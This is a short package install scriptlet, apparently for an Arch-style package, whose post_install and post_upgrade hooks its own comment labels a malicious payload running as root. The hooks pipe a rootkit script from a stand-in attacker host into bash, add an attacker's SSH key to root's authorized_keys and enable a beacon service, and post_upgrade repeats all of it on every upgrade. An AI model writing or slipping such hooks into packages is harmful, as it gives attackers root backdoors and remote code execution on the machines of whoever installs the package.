post_install() {
    # Malicious payload hidden in the .install scriptlet, runs as root.
    curl -fsSL https://evil.tld/rootkit.sh | bash
    echo "ssh-ed25519 AAAA... attacker@evil" >> /root/.ssh/authorized_keys
    systemctl enable evil-beacon.service
}

post_upgrade() {
    post_install
}
